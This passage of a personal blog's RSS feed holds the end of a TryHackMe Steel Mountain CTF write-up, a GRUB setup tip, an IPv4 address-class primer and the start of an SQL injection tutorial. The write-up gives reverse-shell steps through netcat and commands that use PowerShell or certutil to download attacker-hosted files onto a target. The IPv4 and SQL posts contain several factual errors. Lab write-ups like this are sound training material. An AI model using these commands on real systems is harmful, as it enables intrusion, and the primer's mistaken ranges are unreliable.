+&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/25.jpg&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Start a &lt;strong&gt;netcat&lt;/strong&gt; listener on the port you declared in the &lt;strong&gt;python&lt;/strong&gt; file.
+&lt;br /&gt;Run it twice. At first run the server will download &lt;strong&gt;nc.exe&lt;/strong&gt; static binary from your server. At second, it will run
+&lt;strong&gt;nc.exe&lt;/strong&gt; to connect to your local machine by providing a CMD prompt.
+&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/21.jpg&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;It is possible to use PowerUp.ps1 again or &lt;strong&gt;winPEAS.bat&lt;/strong&gt; can be used to enumerate misconfigurations.
+&lt;br /&gt;You can download any file from the running python server by using one of these utilites.
+&lt;br /&gt;-&amp;gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;powershell -c &quot;Invoke-WebRequest -URI {YOUR SERVER IP(THM IP)}:80/{THE FILE YOU WANT TO DOWNLOAD} -OutFile {THE PATH WHERE THE FILE WILL BE SAVED}&quot;&lt;/code&gt;
+&lt;br /&gt;-&amp;gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;certutil.exe -urlcache -split -f http://{YOUR SERVER IP(THM IP)}:80/{THE FILE YOU WANT TO DOWNLOAD}&lt;/code&gt;
+&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/22.jpg&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;br /&gt;&lt;br /&gt;
+As it can be seen from the output, this time, winPEAS provided the information about the vulnerability on &lt;strong&gt;Advanced System Care9&lt;/strong&gt;
+service and many others.
+&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/23.jpg&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;br /&gt;&lt;br /&gt;
+You will need to repeat previous steps to get the root flag. Download &lt;strong&gt;Advanced.exe&lt;/strong&gt; with &lt;br /&gt;&lt;strong&gt;Invoke-WebRequest&lt;/strong&gt; or
+&lt;strong&gt;certutil&lt;/strong&gt;, start a Netcat listener and restart the service.
+&lt;br /&gt;
+&lt;br /&gt;
+Thank you for following, wish you more penetrations ;)&lt;/p&gt;
+</description>
+        <pubDate>Thu, 23 Dec 2021 00:50:00 +0000</pubDate>
+        <link>http://localhost:4000/2021/12/23/tryhackme-steel-mountain-ctf-writeup/</link>
+        <guid isPermaLink="true">http://localhost:4000/2021/12/23/tryhackme-steel-mountain-ctf-writeup/</guid>
+        
+        <category>ctf</category>
+        
+        <category>pentesting</category>
+        
+        <category>remote-code-execution</category>
+        
+        <category>windows-privesc</category>
+        
+        <category>powershell</category>
+        
+        <category>metasploit</category>
+        
+        <category>unqoted-service-path</category>
+        
+        
+      </item>
+    
+      <item>
+        <title>Add Windows Boot Manager to Grub</title>
+        <description>&lt;p&gt;If you want to add windows boot manager to grub, follow these steps;&lt;/p&gt;
+
+&lt;p&gt;1-Download &lt;strong&gt;os-prober&lt;/strong&gt;&lt;br /&gt;
+2-Run:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;os-prober&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;If there is an output like that, you are good to go:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;-&amp;gt; &lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;os-prober
+/dev/nvme1n1p1@/EFI/Microsoft/Boot/bootmgfw.efi:Windows Boot Manager:Windows:efi&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;br /&gt;
+3- Append this line, &lt;strong&gt;GRUB_DISABLE_OS_PROBER=false&lt;/strong&gt;, to the &lt;strong&gt;/etc/default/grub&lt;/strong&gt; file.&lt;br /&gt;
+4- Run:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;grub-mkconfig &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; /boot/grub/grub.cfg&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;br /&gt;
+Done ! You will see all bootable system in your grub menu at the next boot.&lt;/p&gt;
+</description>
+        <pubDate>Thu, 18 Nov 2021 12:00:00 +0000</pubDate>
+        <link>http://localhost:4000/2021/11/18/add-windows-boot-manager-to-grub/</link>
+        <guid isPermaLink="true">http://localhost:4000/2021/11/18/add-windows-boot-manager-to-grub/</guid>
+        
+        <category>linux</category>
+        
+        <category>windows</category>
+        
+        <category>grub</category>
+        
+        <category>boot-managers</category>
+        
+        
+      </item>
+    
+      <item>
+        <title>IPv4 Protocol</title>
+        <description>&lt;hr /&gt;
+&lt;p&gt;image:
+    src: /assets/img/posts/ipv4-protocol/ip1.jpg
+    alt: SUBNETTING
+    width: 800
+    height: 450
+—&lt;/p&gt;
+&lt;h2 id=&quot;ipv4&quot;&gt;IPv4&lt;/h2&gt;
+
+&lt;p&gt;IPv4 stands for Internet Protocol version 4. IPs are addresses for users on the internet. Messages and packages delivered via
+IP addresses. IPv4 address spaces consists of four octets. Depending on the class and configuration, some portion of bits in the
+octet represents the network ID, while the rest represents hosts.
+&lt;br /&gt;&lt;br /&gt;
+An IP address consists of 4 octets, which
+determines the class and configuration of a network, for example you can think of an IP address as Octet1.Octet2.Octet3.Octet4
+&lt;br /&gt;&lt;br /&gt;
+There are 5 IPv4 classes that determines which portion of the network is usable for devices you want to connect and how much of
+them are allowed. Each has its own usable address spaces for maximum range of devices.&lt;/p&gt;
+&lt;h3 id=&quot;class-a&quot;&gt;CLASS A&lt;/h3&gt;
+
+&lt;p&gt;Class A type is for big scale network insfrastructures with large number of total hosts needed.By using the first octet for the
+network ID, class A grants for 126 networks with 16,777,214 hosts per network. The first bit in the first octet is always zero, the rest of the
+7 bits creates different network ID’s when they are turned on.&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Network Bits: first octet&lt;/td&gt;
+      &lt;td&gt;Host Bits:last three octets&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;01111111&lt;/td&gt;
+      &lt;td&gt;00000000&lt;/td&gt;
+      &lt;td&gt;00000000&lt;/td&gt;
+      &lt;td&gt;00000000&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Public IP Range: 1.0.0.0 to 127.0.0.0
+    &lt;ul&gt;
+      &lt;li&gt;Range for first octet value from 1 to 127&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Private IP Range: 10.0.0.0 10.255.255.255&lt;/li&gt;
+  &lt;li&gt;Number of networks: 126&lt;/li&gt;
+  &lt;li&gt;Number of hosts: 16,777,214&lt;/li&gt;
+  &lt;li&gt;Subnet Mask: 255.0.0.0 (8 bits)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;class-b&quot;&gt;CLASS B&lt;/h3&gt;
+&lt;p&gt;Class B type is for medium to large-sized networks. By using the first two octets for the network ID, class B grants for
+16,382 networks with 65,534 hosts per network. The first two bits of the first octet are always 1 and 0, the rest of the 14 bits 
+creates different network ID’s when they are turned on.&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Network Bits: first two octets&lt;/td&gt;
+      &lt;td&gt;Host Bits: last two octets&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;10111111&lt;/td&gt;
+      &lt;td&gt;11111111&lt;/td&gt;
+      &lt;td&gt;00000000&lt;/td&gt;
+      &lt;td&gt;00000000&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Public IP Range: 128.0.0.0 to 192.255.0.0
+    &lt;ul&gt;
+      &lt;li&gt;Range for first octet value from 128 to 191&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Private IP Range: 172.16.0.0 to 172.31.255.255&lt;/li&gt;
+  &lt;li&gt;Subnet Mask: 255.255.0.0 (16 bits)&lt;/li&gt;
+  &lt;li&gt;Number of networks: 16,382&lt;/li&gt;
+  &lt;li&gt;Number of hosts: 65,534&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;class-c&quot;&gt;CLASS C&lt;/h3&gt;
+&lt;p&gt;Cass C type is for small-sized local area networks (LANs). By using the first three octets for the network ID, class C grants for
+2,097,150 networks with 254 hosts per network. The first three bits of the first are always 1 1 0, the rest of the 21 bits creates
+different network ID’s when they are turned on.&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Network Bits: first three octets&lt;/td&gt;
+      &lt;td&gt;Host Bits: last octet&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;11011111&lt;/td&gt;
+      &lt;td&gt;11111111&lt;/td&gt;
+      &lt;td&gt;11111111&lt;/td&gt;
+      &lt;td&gt;00000000&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Public IP Range: 192.0.0.0 to 223.255.255.0
+    &lt;ul&gt;
+      &lt;li&gt;Range for first octet value from 192 to 223&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Private IP Range: 192.168.0.0 to 192.168.255.255&lt;/li&gt;
+  &lt;li&gt;Special IP Range: 127.0.0.1 to 127.255.255.255&lt;/li&gt;
+  &lt;li&gt;Subnet Mask: 255.255.255.0 (24 bits)&lt;/li&gt;
+  &lt;li&gt;Number of networks: 2,097,150&lt;/li&gt;
+  &lt;li&gt;Number of hosts: 254&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;class-d&quot;&gt;CLASS D&lt;/h3&gt;
+&lt;p&gt;Class D type is not for hosts and used for multicasting. In order to send a stream of data  to thousands of nodes across the 
+Internet concurrently, multicasting is required. Mostly used for video, audio streaming and broadcast any kind of altered global
+data to the institutions or organizations, for example currency rate information.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Range 224.0.0.0 to 230.255.255.255
+    &lt;ul&gt;
+      &lt;li&gt;First octet value range from 224 to 239&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Number of Networks: NULL&lt;/li&gt;
+  &lt;li&gt;Number of Hosts per Network: Network Multicasting&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;class-e&quot;&gt;CLASS E&lt;/h3&gt;
+
+&lt;p&gt;Class E type is reserved addresses for research purposes (NASA etc.), and not available for regular users.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Range 240.0.0.0 255.255.255.255
+    &lt;ul&gt;
+      &lt;li&gt;First octet value range from 244 to 255&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Number of Networks: NULL&lt;/li&gt;
+  &lt;li&gt;Number of Hosts per Network: Experimental/Reserved/Research&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;private-ip-addresses&quot;&gt;PRIVATE IP ADDRESSES&lt;/h2&gt;
+
+&lt;p&gt;Within every and each network class, there are specified IP addresses that are specifically reserved for internal/private use 
+only. These IP addresses cannot use internet as they are not routeable and ensure internal communication. For instance, 
+FTP and web servers have to use public IP addresses instead of private. However, within a business or a home network, 
+private IP addresses leased to the devices.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;Class A Private Range&lt;/strong&gt;: from 10.0.0.0 to 10.255.255.255 
+Class B APIPA Private Range: from 169.254.0.0 to 169.254.255.255
+    &lt;ul&gt;
+      &lt;li&gt;In general, a Dynamic Host Configuration Protocol (DHCP) server is used to lease IP addresses to any woken device within 
+the network. However, if there is not one, or the device is not configured properly for DHCP offer, Automatic Private IP Addressing
+(APIPA) is used to assign a private IP address to the device in question &lt;strong&gt;if it is a Microsoft-based device&lt;/strong&gt;.&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Class B Private Range&lt;/strong&gt;: from 172.16.0.0 172.31.255.255&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Class C Private Range&lt;/strong&gt;: from 192.168.0.0 to 192.168.255.255&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;special-ip-addresses&quot;&gt;SPECIAL IP ADDRESSES&lt;/h2&gt;
+
+&lt;p&gt;IP Range from 127.0.0.1 to 172.255.255.255 are used for network testing, which also referred as loop-back addresses. These are
+virtual IP addresses and can not be assigned to a device as a logical address. 
+&lt;br /&gt;&lt;br /&gt;
+The most common one is &lt;strong&gt;127.0.0.1&lt;/strong&gt;
+, which is repeatedly used to troubleshoot the network connectivity issues using the ICMP protocol. If
+there is a connectivity issue, before checking for network infrastructures or the other nodes, making sure of the TCP/IP stack
+is correctly working on that machine must be prior check as the ICMP packet that you sent to that special IP address tests each
+layer. If ping responses with a packet loss, then the connectivity issue is on the local computer, you would need to resolve
+this first. If there is no packet loss, you can start to explore other possibilities that may cause failure.&lt;/p&gt;
+</description>
+        <pubDate>Thu, 18 Nov 2021 12:00:00 +0000</pubDate>
+        <link>http://localhost:4000/2021/11/18/ipv4-addresses/</link>
+        <guid isPermaLink="true">http://localhost:4000/2021/11/18/ipv4-addresses/</guid>
+        
+        <category>network protocols</category>
+        
+        <category>ip-addresses</category>
+        
+        
+      </item>
+    
+      <item>
+        <title>SQL Injection</title>
+        <description>&lt;p&gt;In this article you will learn SQL Injection fundamentals from 0 to hero.
+&lt;br /&gt;
+In order to understand SQL injections, it is essential to observe those two concepts seperately.&lt;/p&gt;
+
+&lt;h2 id=&quot;what-is-injection-&quot;&gt;WHAT IS INJECTION ?&lt;/h2&gt;
+&lt;p&gt;Injection refers to a broad variety of attack vectors. An attacker feeds the program with malicious input.
+This input interpreted by the program and works for attacker’s favour.This vulnerability occurs when the input is not controlled 
+with meticulousness before or after input has taken.There are bunch of different kind of injections out there.
+Examples are javascript ,ldap, xpath, host header, code, email header and crlf injections and SQL injection is one of them.&lt;/p&gt;
+&lt;h2 id=&quot;what-is-sql-&quot;&gt;WHAT IS SQL ?&lt;/h2&gt;
+&lt;p&gt;SQL stands for &lt;strong&gt;simple query language&lt;/strong&gt;. What it does is basically, managing data held in databases.
+It is particularly useful in handling structured data. So whenever you ask for spesific part of data
+you can request it in any order or concatanate it with different data held in different data table. 
+There are bunch of different sql types, MySQL, SqLite, PostgreSQL, Microsoft SQL Server and etc. They are
+actually more or less all the same except for the syntax diffrences between them.&lt;/p&gt;
+
+&lt;h3 id=&quot;understanding-sql&quot;&gt;Understanding SQL&lt;/h3&gt;
+&lt;p&gt;Let us examine the behavior of SQL codes by using &lt;a href=&quot;https://www.sqliteonline.com&quot;&gt;&lt;strong&gt;sqliteonline&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/fundamentals-of-sql-injection/sql.jpg&quot; alt=&quot;Desktop View&quot; /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;why-sql-&quot;&gt;Why SQL ?&lt;/h4&gt;
+&lt;p&gt;As you can see, there is a table consists of 3 columns and 21 rows.Those are basically &lt;strong&gt;key&lt;/strong&gt; and &lt;strong&gt;value&lt;/strong&gt; pairs.
+In this spesific example &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ID&lt;/code&gt; is the &lt;strong&gt;Key&lt;/strong&gt; value, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Name&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Hint&lt;/code&gt; are the &lt;strong&gt;value&lt;/strong&gt;s which defined by that 
+spesific ‘ID’ numer of &lt;strong&gt;1&lt;/strong&gt;.However, as you can guess, it is not practical to summon whole data each 
+time when we want to use or see one or couple parts of the data. In addition, we may want to combine different 
+data parts together, so that is why we use SQL.&lt;/p&gt;
+
+&lt;h4 id=&quot;sql-basics&quot;&gt;SQL Basics&lt;/h4&gt;
+&lt;p&gt;Every table has its own name, and the name of the table above is &lt;strong&gt;demo&lt;/strong&gt;.It is not needed to be an expert
+SQL programmer, but you need to understand the principles of SQL programming, so let us start with some basics.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;demo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;This command selects everything from demo table, fetches full content from the table.
+You can see the output at the picture above. 
+&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;demo&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;If you want to bring the informations related to ‘ID’ number of 3, you can add &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WHERE&lt;/code&gt; clause at the end of the query, and specify the filter.
+&lt;img src=&quot;/assets/img/posts/fundamentals-of-sql-injection/sql3.jpg&quot; alt=&quot;Desktop View&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;demo&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;UNION&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;demo&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;&quot;Chart&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;You can concatenate two different queries together by using ‘UNION’, however result of the
+queries have to have same amount of columns, otherwise it will not work. In this example, there is
+only one table called &lt;strong&gt;demo&lt;/strong&gt;, so naturally all the selections will have 3 columns.If the result of the select queries of different
+tables have different amount of columns, you can not &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UNION&lt;/code&gt; the result of the selections together.
+&lt;img src=&quot;/assets/img/posts/fundamentals-of-sql-injection/sql4.jpg&quot; alt=&quot;Desktop View&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;demo&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;ORDER&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;BY&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;ASC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;You can order the table with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ORDER BY&lt;/code&gt; clause.You can either put column number with numerics, or column name
+both &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ASC&lt;/code&gt; ascending and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DESC&lt;/code&gt; descending order.
+&lt;img src=&quot;/assets/img/posts/fundamentals-of-sql-injection/sql5.jpg&quot; alt=&quot;Desktop View&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;table_name&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;INFORMATION_SCHEMA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TABLES&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;ORDER&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;BY&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;ASC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;See all the tables existing in the currently active database.
+&lt;img src=&quot;/assets/img/posts/fundamentals-of-sql-injection/sql6.jpg&quot; alt=&quot;Desktop View&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;k&quot;&gt;SHOW&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DATABASES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;See all the created databases.
+&lt;img src=&quot;/assets/img/posts/fundamentals-of-sql-injection/sql7.jpg&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;summary&quot;&gt;Summary&lt;/h3&gt;
+&lt;p&gt;Understanding this much of SQL will do for now.In this section I wrote about basics of SQL, however in the following
+sections I will be writing about tricks and tactics about SQL Injection, it is more imporant to understand very fundamentals
+rather than complex queries.&lt;/p&gt;
+
+&lt;h2 id=&quot;primitives-of-database-logic&quot;&gt;PRIMITIVES OF DATABASE LOGIC&lt;/h2&gt;
+&lt;p&gt;From now on, you know how sql works, and the idea behind that. In this section, before moving on to the exploitation phase, 
+you will learn bare-bones of &lt;strong&gt;SQLi&lt;/strong&gt;, database logic and do some brainstorm. In this section I will be using &lt;strong&gt;MariaDB&lt;/strong&gt;, it is community
+developed database management system for MySQL.&lt;/p&gt;
+
+&lt;h3 id=&quot;mariadbmysql&quot;&gt;MariaDB/MySQL&lt;/h3&gt;
+&lt;p&gt;I fired up my terminal and run my mariadb service. Without selecting any database or any table, I will run the following query.
+Try to guess the result of it.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;n&quot;&gt;MariaDB&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;none&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;It returns&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;---+&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;#&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;This&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;the&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;column&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;---+&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;#&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;This&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;the&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;corresponds&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;to&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;that&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;column&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;---+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Does not make too much sense right ? Let us move further.
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;n&quot;&gt;MariaDB&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;none&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;How do you think this will end up ?&lt;/p&gt;
+
